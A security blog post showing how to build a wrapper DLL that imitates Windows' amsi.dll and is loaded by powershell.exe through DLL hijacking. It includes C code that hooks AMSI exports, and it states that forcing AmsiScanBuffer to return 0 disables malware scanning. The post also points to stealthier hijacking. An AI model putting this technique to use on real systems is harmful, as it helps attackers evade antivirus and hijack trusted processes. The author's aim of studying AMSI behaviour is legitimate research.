---
title: Manual DLL-Wrapping technique (AMSI DLL-Implant)
createdAt: 06/05/2024
---

**TLDR**: [Repository with final AMSI Dll-Implant](https://github.com/Print3M/amsi-memory-patching?tab=readme-ov-file)

## Standard DLL-Proxy using for DLL Hijacking

Many tutorials show the easiest methods to implement DLL-Wrapper (or maybe I should call it DLL-Proxy) using the following syntax:

```c
#pragma comment(linker, "/export:exportedFunc=legitDll.exportedFunc")
```

This actually exports a legitimate function (`exportedFunc`) from our custom DLL. The problem is that this way we have no actual control over the function. Usually in the case of standard DLL hijacking it looks like this:

```c
#include "pch.h"

// Exported legit functions
#pragma comment(linker, "/export:exampleFunc1=legitDll.exampleFunc1")
#pragma comment(linker, "/export:exampleFunc2=legitDll.exampleFunc2")

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  reason, LPVOID lpReserved)
{
    if (reason == DLL_PROCESS_ATTACH) {
        /* MALICIOUS CODE HERE */
    }

    return TRUE;
}
```

As we can see above, our action is performed only when the DLL is loaded. We have no direct control over the functions we export. But I want to control the execution of these functions - the incoming parameters and the returned values. I want to add my own DLL-implant. This can come in handy for **more stealthy DLL-Hijacking tactics**, or for conveniently manipulating module parameters to get a better idea of what is going on.

It can also be a way to bypass certain security features as in the case of AMSI. By controlling the `AmsiScanBuffer()` function from `amsi.dll` we are able to return `0` every time and effectively disable AMSI checks. See [my previous post](/blog/amsi-memory-patching-bypass) for a better understanding of this concept.

So how can we do it? Well, we can create functions in our custom `fake-amsi.dll` DLL module, whose names and parameters will coincide with those of the legit `amsi.dll`. Let's see what is exported from `amsi.dll` using PE-bear program:

![PE-bear screenshot: exported functions of amsi.dll](/imgs/amsi-dll-wrapper/1.png)

Here we see the names of the functions we need to export from our DLL module. We also need to know what parameters these functions expect. This is what we can find out from the Microsoft documentation: [amsi.h header](https://learn.microsoft.com/en-us/windows/win32/api/amsi/).  

> I thought that when writing my own wrapper-functions, in addition to the name and parameters of functions, I also need to keep the calling convention in sync with the legit DLL. It turned out that with x86-64 architecture Microsoft uses only one calling convention. Basically all calling conventions (e.g. stdcall, thiscall, cdecl, and fastcall) resolve to using this _one ultimate convention_. Special keywords like `__fastcall` are simply ignored by compiler. [Read more here](https://en.wikipedia.org/wiki/X86_calling_conventions#Microsoft_x64_calling_convention).

Now we have everything to start implementing our DLL wrapper. First we load legit-amsi.dll using the absolute path, then we get the addresses of the functions we want to wrap.

```c
void DllInit() {
    // Load legit-AMSI module
    HMODULE hAmsiDll = LoadLibraryA("C:\\Windows\\System32\\amsi.dll");
    
    // Get addresses of legit-AMSI functions
    pAmsiInitialize = (AmsiInitializeT)GetProcAddress(hAmsiDll, "AmsiInitialize");
    pAmsiOpenSession = (AmsiOpenSessionT)GetProcAddress(hAmsiDll, "AmsiOpenSession");
    pAmsiCloseSession = (AmsiCloseSessionT)GetProcAddress(hAmsiDll, "AmsiCloseSession");
    pAmsiScanBuffer = (AmsiScanBufferT)GetProcAddress(hAmsiDll, "AmsiScanBuffer");
    pAmsiScanString = (AmsiScanStringT)GetProcAddress(hAmsiDll, "AmsiScanString");
    pAmsiUninitialize = (AmsiUninitializeT)GetProcAddress(hAmsiDll, "AmsiUninitialize");
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved)
{
    if (reason == DLL_PROCESS_ATTACH) {
        // Load legit-AMSI when DLL is attached
        DllInit();
        printf("[+] Custom AMSI.DLL loaded\n");
    }

    return TRUE;
}
```

Then we create wrappers for each function according to the scheme below. It's best to make a wrapper for each function to make sure that everything will work flawlessly and no one will realize that it's just a wrapper for a legitimate DLL.

> I write in C++, so `extern "C"` is used to avoid default name mangling of exported functions. `__declspec(dllexport)` is used to export a function from our DLL file.

```c
// Type of AmsiInitialize function pointer
typedef HRESULT(*AmsiInitializeT)(LPCWSTR, HAMSICONTEXT*);

// AmsiInitialize function pointer
AmsiInitializeT pAmsiInitialize;

// AmsiInitialize function wrapper
extern "C" __declspec(dllexport) HRESULT AmsiInitialize(LPCWSTR appName, HAMSICONTEXT * amsiContext) {
    /*
        Here we can do whatever malicious or debug things we want.

        Then call legit AmsiInitialize function so that no one will
        realize that something has been changed 
    */
    return pAmsiInitialize(appName, amsiContext);
}
```

After compiling as a DLL file, we can see the exported functions again using PE-Bear:

![PE-bear screenshot: exported functions of custom amsi-implant.dll](/imgs/amsi-dll-wrapper/2.png)

I didn't implement literally all the functions from the original amsi.dll, but the rest proved useless, at least for my case. `powershell.exe`, like most executable binaries, looks for DLL modules in the same directory where the .exe file is located. This allows us to perform **DLL hijacking** and give him our fake `amsi.dll` implant.

![Location of amsi.dll implant in powershell.exe folder](/imgs/amsi-dll-wrapper/3.png)

The implant is ready. Of course, this is also one of the AMSI bypass techniques, because we fully control the execution of the `AmsiScanBuffer()` function, so it can always return `0` and execute any PowerShell script we want. My goal, however, was to see what exactly is sent, and what AMSI (actually Windows Defender) returns, in the case of a malicious script:

![PowerShell command-line with amsi.dll implant](/imgs/amsi-dll-wrapper/4.png)

We can see that our implant is working. It is loaded right at the start of `powershell.exe` which sends the entire PowerShell startup scripts to AMSI **without any chunking at all**. Literally every command you type, every line of PowerShell is scanned by AMSI. Now let's check what happens when AMSI detects a malicious PowerShell script.

![amsi.dll implant detects malicious PowerShell script](/imgs/amsi-dll-wrapper/5.png)

Highlighted in yellow is the result that the `ScanStringBuffer()` function returned on the malicious script. Microsoft's documentation says: _Any return result equal to or larger than 32768 is considered malware_ ([source](https://learn.microsoft.com/en-us/windows/win32/api/amsi/ne-amsi-amsi_result)). Our value is exactly `32768` which means everything works as intended. From my observations, this number (at least with the default Windows Defender) is never higher than `32768`, although it could be.

The experiment was successful. Now you know how to manually create your own wrappers for DLL modules and have full control over the execution of exported functions.

\~ Print3M
